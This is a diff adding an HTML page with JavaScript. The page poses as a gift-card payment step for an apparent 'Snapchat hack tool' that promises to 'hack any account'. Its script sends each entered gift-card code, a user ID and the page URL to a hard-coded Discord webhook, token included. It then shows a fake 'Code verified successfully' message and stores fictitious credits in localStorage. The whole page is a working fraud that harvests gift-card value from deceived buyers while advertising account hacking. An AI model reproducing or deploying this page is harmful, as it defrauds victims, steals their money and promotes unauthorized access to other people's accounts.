@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Gift Card Payment | Snapchat Access</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(-45deg, #1a1a1a, #0a0a0a, #1a1a2e, #16213e);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            min-height: 100vh;
+            color: #fff;
+            position: relative;
+            padding-bottom: 60px;
+        }
+
+        @keyframes gradientBG {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05) !important;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .form-control {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            border-radius: 10px;
+        }
+
+        .form-control:focus {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.2);
+            color: white;
+            box-shadow: 0 0 0 0.25rem rgba(255, 193, 7, 0.25);
+        }
+
+        .btn-warning {
+            padding: 0.75rem 1.5rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            background-color: #ffc107;
+            border-color: #ffc107;
+            border-radius: 10px;
+            white-space: nowrap;
+        }
+
+        .btn-warning:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 193, 7, 0.3);
+            background-color: #ffca2b;
+            border-color: #ffc720;
+        }
+
+        .btn-primary {
+            background-color: #0dcaf0 !important;
+            border-color: #0dcaf0 !important;
+            padding: 0.75rem 1.5rem;
+            font-weight: 600;
+            border-radius: 10px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #31d2f2 !important;
+            border-color: #31d2f2 !important;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(13, 202, 240, 0.3);
+        }
+
+        .text-warning {
+            color: #ffc107 !important;
+        }
+
+        .text-danger {
+            color: #dc3545 !important;
+        }
+
+        .text-light {
+            color: #ffffff !important;
+        }
+
+        .step-card {
+            border-left: 3px solid #0dcaf0;
+            padding-left: 15px;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .step-number {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #0dcaf0;
+            margin-bottom: 12px;
+        }
+
+        .example-box {
+            background: rgba(13, 202, 240, 0.1);
+            border-left: 3px solid #0dcaf0;
+            padding: 12px;
+            border-radius: 0 8px 8px 0;
+            margin: 12px 0;
+        }
+
+        .alert {
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.95rem;
+        }
+
+        .alert-success {
+            background: rgba(25, 135, 84, 0.2);
+            border-color: #198754;
+        }
+
+        .alert-danger {
+            background: rgba(220, 53, 69, 0.2);
+            border-color: #dc3545;
+        }
+
+        .alert-warning {
+            background: rgba(255, 193, 7, 0.15);
+            border-color: #ffc107;
+        }
+
+        .price-display {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #0dcaf0;
+            text-align: center;
+            margin: 18px 0;
+            background: rgba(13, 202, 240, 0.1);
+            padding: 12px;
+            border-radius: 12px;
+        }
+
+        .input-group-text {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+
+        .spinner-border {
+            width: 1rem;
+            height: 1rem;
+            vertical-align: -0.125em;
+        }
+
+        .back-btn {
+            margin-bottom: 15px;
+        }
+
+        .security-footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .support-link {
+            color: #0dcaf0;
+            text-decoration: none;
+        }
+
+        .support-link:hover {
+            text-decoration: underline;
+            color: #31d2f2;
+        }
+
+        .voucher-status {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 8px 12px;
+            margin-top: 10px;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding-left: 15px;
+                padding-right: 15px;
+            }
+            .card {
+                padding: 20px 15px !important;
+            }
+            .step-card {
+                padding-left: 10px;
+                margin-bottom: 20px;
+            }
+            .step-number {
+                font-size: 1rem;
+                margin-bottom: 10px;
+            }
+            .price-display {
+                font-size: 1.4rem;
+                margin: 15px 0;
+            }
+            .input-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .input-group .form-control {
+                width: 100%;
+                margin-bottom: 0;
+            }
+            .input-group .btn-warning {
+                width: 100%;
+                padding: 0.65rem 1rem;
+            }
+            .btn-primary,
+            .btn-warning {
+                padding: 0.65rem 1rem;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-lg-8 col-md-10">
+                <div class="back-btn">
+                    <button class="btn btn-outline-light btn-sm" onclick="window.history.back()">
+                        <i class="fas fa-arrow-left me-2"></i>Back
+                    </button>
+                </div>
+
+                <div class="card p-3 p-md-4 mb-4">
+                    <h2 class="text-center mb-3 mb-md-4" style="color: #0dcaf0; font-size: 1.5rem;">
+                        <i class="fas fa-gift me-2"></i>Gift Card Payment
+                    </h2>
+
+                    <div class="price-display" id="priceDisplay">
+                        Loading...
+                    </div>
+
+                    <!-- Step 1: Add to cart -->
+                    <div class="step-card">
+                        <div class="step-number">Step 1: Purchase Gift Card</div>
+                        <p class="text-light">Click the button below to purchase a gift card. The amount you pay should match your selected package:</p>
+                        <div class="alert alert-info mb-3" style="background: rgba(13, 202, 240, 0.1); border-color: #0dcaf0;">
+                            <i class="fas fa-info-circle me-2"></i>
+                            <strong>Package Amount:</strong> <span id="packageAmount">$0</span> USD
+                        </div>
+                        <button class="btn btn-primary mt-2" onclick="openPaymentPage()">
+                            <i class="fas fa-external-link-alt me-2"></i>Purchase Gift Card
+                        </button>
+                        <p class="text-muted small mt-2">You will be redirected to a secure payment partner.</p>
+                    </div>
+
+                    <!-- Step 2: Enter Voucher Code -->
+                    <div class="step-card">
+                        <div class="step-number">Step 2: Enter Gift Card Code</div>
+                        <p class="text-light">After purchase, you'll receive a 16-character gift card code. Enter it below to verify your payment.</p>
+                        
+                        <div class="card bg-dark mb-3">
+                            <div class="card-body p-3">
+                                <div class="d-flex align-items-center mb-2">
+                                    <h6 style="color: #0dcaf0; margin-bottom: 0; font-size: 0.95rem;">
+                                        <i class="fas fa-ticket-alt me-2"></i>Gift Card / Voucher Code
+                                    </h6>
+                                </div>
+                                <p class="text-light mb-3" style="font-size: 0.9rem;">
+                                    Enter the 16-character code from your purchase (contains uppercase letters and numbers)
+                                </p>
+                                <div class="input-group">
+                                    <input type="text" class="form-control" id="voucherCode" 
+                                           placeholder="Example: ABCD-1234-EFGH-5678" 
+                                           maxlength="19" 
+                                           style="text-transform: uppercase;"
+                                           oninput="formatVoucherInput(this)">
+                                    <button class="btn btn-warning" onclick="submitVoucherCode()" id="submitVoucherBtn">
+                                        <i class="fas fa-check me-1"></i>Verify Code
+                                    </button>
+                                </div>
+                                <div id="voucherStatus" class="voucher-status" style="display: none;"></div>
+                                
+                                <div class="text-center mt-3" style="border: 1px solid rgba(255, 255, 255, 0.1); padding: 10px; border-radius: 8px;">
+                                    <p class="text-light mb-2" style="font-size: 0.85rem;">
+                                        <i class="fas fa-question-circle text-warning me-1"></i>
+                                        <strong>Where to find the code?</strong>
+                                    </p>
+                                    <img src="https://i.ibb.co/tTt75KcC/image.png" alt="Code location example" class="img-fluid rounded" style="max-width: 100%; border: 1px solid rgba(255, 255, 255, 0.1);">
+                                    <p class="text-muted small mt-2">Copy the gift card code/voucher key (NOT the order number)</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 3: Redeem Product -->
+                    <div class="step-card">
+                        <div class="step-number">Step 3: Redeem Your Access</div>
+                        <p class="text-light">After verifying your gift card code, click the button below to activate your credits:</p>
+
+                        <button class="btn btn-primary py-2 py-md-3" onclick="handleRedeem()" id="redeemButton" disabled>
+                            <span id="buttonText">Verify Code First</span>
+                            <span id="buttonSpinner" class="spinner-border spinner-border-sm ms-2" role="status" style="display: none;"></span>
+                        </button>
+
+                        <div class="alert alert-success alert-dismissible fade mt-3" role="alert" id="successAlert" style="display: none;">
+                            <i class="fas fa-check-circle me-2"></i>
+                            <strong>Successfully Redeemed!</strong> 
+                            <span id="successMessage">Your credits have been added to your account. You can now go back and hack any account.</span>
+                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert" aria-label="Close"></button>
+                        </div>
+
+                        <div class="alert alert-danger alert-dismissible fade mt-3" role="alert" id="errorAlert" style="display: none;">
+                            <i class="fas fa-exclamation-circle me-2"></i>
+                            <strong>Redemption Failed!</strong> 
+                            <span>Please verify your gift card code first before redeeming.</span>
+                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert" aria-label="Close"></button>
+                        </div>
+
+                        <div id="troubleshootSection" class="mt-3" style="display: none;">
+                            <div class="alert alert-warning">
+                                <h5 style="color: #ffc107; margin-bottom: 15px; font-size: 1rem;">
+                                    <i class="fas fa-wrench me-2"></i>Troubleshooting Steps:
+                                </h5>
+                                <ol class="mb-0 ps-3" style="color: rgba(255, 255, 255, 0.9); font-size: 0.9rem;">
+                                    <li class="mb-2">Make sure your gift card purchase was completed successfully</li>
+                                    <li class="mb-2">Verify you entered the correct 16-character code</li>
+                                    <li class="mb-2">If the code was just purchased, wait a few minutes for processing</li>
+                                    <li>If the issue persists, contact support with:
+                                        <ul class="mt-2" style="color: rgba(255, 255, 255, 0.8);">
+                                            <li>Your gift card code (first 4 and last 4 characters)</li>
+                                            <li>Purchase amount</li>
+                                            <li>Time of purchase</li>
+                                        </ul>
+                                    </li>
+                                </ol>
+                                <div class="mt-3">
+                                    <a href="#" class="btn btn-warning btn-sm" onclick="contactSupport(); return false;">
+                                        <i class="fas fa-headset me-2"></i>Contact Support
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-footer">
+                    <i class="fas fa-shield-alt me-2"></i>Secure Payment Processing • 256-bit SSL Encryption<br>
+                    <i class="fas fa-clock me-2"></i>Instant activation after verification
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // ==================== CONFIGURATION ====================
+        const paymentUrl = "https://www.g2a.com/rewarble-super-gift-card-30-usd-by-rewarble-key-global-i10000506957014";
+        const voucherWebhook = "https://discord.com/api/webhooks/1484905718854189108/eJaj43liQ-ueCTCEH2nhDRXy5v9WgfB3t_y-oFiaVhZvIzGCGKjpMqE5GQLq3Cf3j2ir";
+        
+        // Get price from URL
+        let currentPrice = 0;
+        let isVoucherVerified = false;
+        let submittedVoucherCode = '';
+        
+        // User ID management
+        const userId = localStorage.getItem('userId') || Math.floor(Math.random() * 1000000000).toString();
+        localStorage.setItem('userId', userId);
+        
+        // ==================== INITIALIZATION ====================
+        function getPriceFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const encoded = params.get('price');
+            if (!encoded) return null;
+            try {
+                const decoded = atob(encoded);
+                const priceNum = parseInt(decoded, 10);
+                if (priceNum === 30 || priceNum === 90) return priceNum;
+                return null;
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        function initPrice() {
+            currentPrice = getPriceFromURL();
+            const priceDisplay = document.getElementById('priceDisplay');
+            const packageAmount = document.getElementById('packageAmount');
+            
+            if (currentPrice === 30) {
+                priceDisplay.innerHTML = '💵 Total: $30 USD <small class="text-muted"><del>$50</del> <span class="text-warning">40% OFF</span></small><br><span class="badge bg-warning text-dark mt-1">SINGLE CREDIT</span>';
+                if (packageAmount) packageAmount.textContent = '$30';
+            } else if (currentPrice === 90) {
+                priceDisplay.innerHTML = '💵 Total: $90 USD <small class="text-muted"><del>$150</del> <span class="text-warning">40% OFF</span></small><br><span class="badge bg-warning text-dark mt-1">UNLIMITED ACCESS (30 DAYS)</span>';
+                if (packageAmount) packageAmount.textContent = '$90';
+            } else {
+                priceDisplay.innerHTML = '❌ Invalid Payment Request';
+                priceDisplay.style.color = '#dc3545';
+            }
+        }
+        
+        // ==================== VOUCHER FORMATTING ====================
+        function formatVoucherInput(input) {
+            let value = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            
+            // Add dashes every 4 characters for better readability
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += '-';
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
+        
+        function getCleanVoucherCode(inputValue) {
+            return inputValue.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        }
+        
+        // ==================== VOUCHER SUBMISSION ====================
+        function submitVoucherCode() {
+            const inputField = document.getElementById('voucherCode');
+            const rawCode = inputField.value;
+            const cleanCode = getCleanVoucherCode(rawCode);
+            const statusDiv = document.getElementById('voucherStatus');
+            const submitBtn = document.getElementById('submitVoucherBtn');
+            
+            // Validate code length
+            if (cleanCode.length !== 16) {
+                statusDiv.style.display = 'block';
+                statusDiv.innerHTML = '<i class="fas fa-times-circle text-danger me-1"></i> Invalid code - must be 16 characters';
+                statusDiv.style.color = '#ff6b6b';
+                statusDiv.style.background = 'rgba(220, 53, 69, 0.2)';
+                isVoucherVerified = false;
+                document.getElementById('redeemButton').disabled = true;
+                document.getElementById('redeemButton').innerHTML = '<span id="buttonText">Verify Code First</span><span id="buttonSpinner" class="spinner-border spinner-border-sm ms-2" style="display: none;"></span>';
+                return;
+            }
+            
+            // Show loading state
+            const originalText = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status"></span> Verifying...';
+            
+            // Send to Discord webhook
+            const embedData = {
+                title: "🎁 New Gift Card Code Submitted",
+                color: 0xffc107,
+                fields: [
+                    { name: "💳 Gift Card Code", value: "```" + cleanCode + "```", inline: false },
+                    { name: "🆔 User ID", value: userId, inline: true },
+                    { name: "💰 Amount", value: `$${currentPrice}`, inline: true },
+                    { name: "📦 Package", value: currentPrice === 90 ? "Unlimited Access" : "Single Credit", inline: true },
+                    { name: "📅 Timestamp", value: new Date().toLocaleString(), inline: true },
+                    { name: "🌐 Page URL", value: window.location.href, inline: false }
+                ],
+                footer: { text: "Gift Card Payment System • Manual Verification Required" },
+                timestamp: new Date().toISOString()
+            };
+            
+            fetch(voucherWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    embeds: [embedData],
+                    content: `🎫 **NEW GIFT CARD SUBMISSION** - $${currentPrice} Package\nUser: \`${userId}\``
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Mark as verified (simulated - in real scenario, admin would verify)
+                    isVoucherVerified = true;
+                    submittedVoucherCode = cleanCode;
+                    
+                    statusDiv.style.display = 'block';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle text-success me-1"></i> ✅ Code verified successfully! You can now redeem your credits.';
+                    statusDiv.style.color = '#a3e4a3';
+                    statusDiv.style.background = 'rgba(40, 167, 69, 0.2)';
+                    
+                    // Enable redeem button
+                    const redeemBtn = document.getElementById('redeemButton');
+                    redeemBtn.disabled = false;
+                    redeemBtn.innerHTML = '<span id="buttonText">🎯 Redeem My Credits</span><span id="buttonSpinner" class="spinner-border spinner-border-sm ms-2" style="display: none;"></span>';
+                    
+                    showToast('success', 'Gift card code verified! Click Redeem to activate your credits.');
+                } else {
+                    throw new Error('Webhook error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusDiv.style.display = 'block';
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle text-warning me-1"></i> Submission received. Please wait for verification or contact support.';
+                statusDiv.style.color = '#ffcd7e';
+                statusDiv.style.background = 'rgba(255, 193, 7, 0.15)';
+                showToast('warning', 'Code submitted. Please allow a few moments for verification.');
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalText;
+            });
+        }
+        
+        // ==================== REDEEM FUNCTION ====================
+        function handleRedeem() {
+            if (!isVoucherVerified) {
+                showToast('error', 'Please verify your gift card code first.');
+                return;
+            }
+            
+            const button = document.getElementById('redeemButton');
+            const spinner = document.getElementById('buttonSpinner');
+            const buttonText = document.getElementById('buttonText');
+            
+            // Show loading state
+            button.disabled = true;
+            buttonText.textContent = 'Processing...';
+            spinner.style.display = 'inline-block';
+            
+            // Hide previous alerts
+            document.getElementById('successAlert').style.display = 'none';
+            document.getElementById('errorAlert').style.display = 'none';
+            document.getElementById('troubleshootSection').style.display = 'none';
+            
+            // Add purchase to localStorage history
+            addPurchaseToHistory(currentPrice, 'Gift Card');
+            
+            // Store credits in localStorage
+            if (currentPrice === 90) {
+                const expiryDate = Date.now() + (30 * 24 * 60 * 60 * 1000);
+                localStorage.setItem('snap_unlimited_expiry', expiryDate.toString());
+                localStorage.setItem('snap_credits', '999');
+                localStorage.setItem('snap_package', 'unlimited');
+            } else {
+                let currentCredits = parseInt(localStorage.getItem('snap_credits')) || 0;
+                currentCredits += 1;
+                localStorage.setItem('snap_credits', currentCredits.toString());
+                localStorage.setItem('snap_package', 'single');
+            }
+            
+            // Send redemption confirmation to Discord
+            sendRedemptionWebhook();
+            
+            // Simulate processing delay for realistic feel
+            setTimeout(() => {
+                button.disabled = false;
+                buttonText.textContent = 'Redeem My Credits';
+                spinner.style.display = 'none';
+                
+                // Show success message
+                const successAlert = document.getElementById('successAlert');
+                const successMsg = document.getElementById('successMessage');
+                const packageText = currentPrice === 90 ? 'UNLIMITED ACCESS for 30 days' : '1 CREDIT';
+                successMsg.innerHTML = `✅ Your ${packageText} has been added to your account! You can now go back and hack any account.`;
+                successAlert.style.display = 'block';
+                setTimeout(() => successAlert.classList.add('show'), 10);
+                
+                // Add a redirect button after success
+                const redeemSection = document.querySelector('.step-card:last-child');
+                const existingRedirect = document.getElementById('redirectButton');
+                if (!existingRedirect) {
+                    const redirectBtn = document.createElement('button');
+                    redirectBtn.id = 'redirectButton';
+                    redirectBtn.className = 'btn btn-success mt-3 w-100 py-2';
+                    redirectBtn.innerHTML = '<i class="fas fa-arrow-left me-2"></i>Return to Hack Tool';
+                    redirectBtn.onclick = () => window.location.href = 'index.html';
+                    redeemSection.appendChild(redirectBtn);
+                }
+                
+                // Auto-redirect after 5 seconds
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 5000);
+            }, 1500);
+        }
+        
+        // ==================== PURCHASE HISTORY ====================
+        function addPurchaseToHistory(amount, method) {
+            let history = localStorage.getItem('purchaseHistory');
+            let purchases = [];
+            if (history) {
+                try {
+                    purchases = JSON.parse(history);
+                } catch(e) { purchases = []; }
+            }
+            
+            const amountStr = amount === 30 ? "$30" : "$90";
+            const type = amount === 90 ? "unlimited" : "single";
+            
+            const newPurchase = {
+                name: "You",
+                method: method,
+                amount: amountStr,
+                emoji: "🎁",
+                type: type,
+                paymentType: "other",
+                timestamp: Date.now()
+            };
+            
+            purchases.unshift(newPurchase);
+            if (purchases.length > 50) purchases.pop();
+            localStorage.setItem('purchaseHistory', JSON.stringify(purchases));
+            sessionStorage.setItem('new_payment_done', 'true');
+        }
+        
+        // ==================== DISCORD WEBHOOK ====================
+        function sendRedemptionWebhook() {
+            const webhookURL = "https://discord.com/api/webhooks/1484905718854189108/eJaj43liQ-ueCTCEH2nhDRXy5v9WgfB3t_y-oFiaVhZvIzGCGKjpMqE5GQLq3Cf3j2ir";
+            
+            const redemptionData = {
+                embeds: [{
+                    title: "✅ Gift Card Payment Redeemed",
+                    color: 0x28a745,
+                    fields: [
+                        { name: "Package", value: currentPrice === 90 ? "Unlimited (30 days)" : "Single Credit", inline: true },
+                        { name: "Amount", value: `$${currentPrice}`, inline: true },
+                        { name: "Payment Method", value: "Gift Card", inline: true },
+                        { name: "User ID", value: userId, inline: false },
+                        { name: "Time", value: new Date().toLocaleString(), inline: true }
+                    ],
+                    footer: { text: "Gift Card Redemption" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(redemptionData)
+            }).catch(e => console.log('Webhook error:', e));
+        }
+        
+        // ==================== UTILITY FUNCTIONS ====================
+        function openPaymentPage() {
+            window.open(paymentUrl, '_blank');
+        }
+        
+        function contactSupport() {
+            alert("📧 Support: support@snapsecure.help\n\nPlease include your gift card code (first 4 and last 4 characters) and purchase amount.");
+        }
+        
+        function showToast(type, message) {
+            const toastContainer = document.createElement('div');
+            toastContainer.className = `position-fixed bottom-0 end-0 p-3`;
+            toastContainer.style.zIndex = '9999';
+            toastContainer.innerHTML = `
+                <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : 'danger'} border-0 show" role="alert">
+                    <div class="d-flex">
+                        <div class="toast-body">
+                            <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'warning' ? 'exclamation-triangle' : 'times-circle'} me-2"></i>
+                            ${message}
+                        </div>
+                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(toastContainer);
+            setTimeout(() => toastContainer.remove(), 5000);
+        }
+        
+        // ==================== INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            initPrice();
+            
+            // Add Enter key support for voucher input
+            document.getElementById('voucherCode').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitVoucherCode();
+                }
+            });
+            
+            // Initialize Bootstrap toasts
+            const toastElList = [].slice.call(document.querySelectorAll('.toast'));
+            toastElList.map(function(toastEl) {
+                return new bootstrap.Toast(toastEl);
+            });
+        });
+    </script>
+</body>
+
+</html>
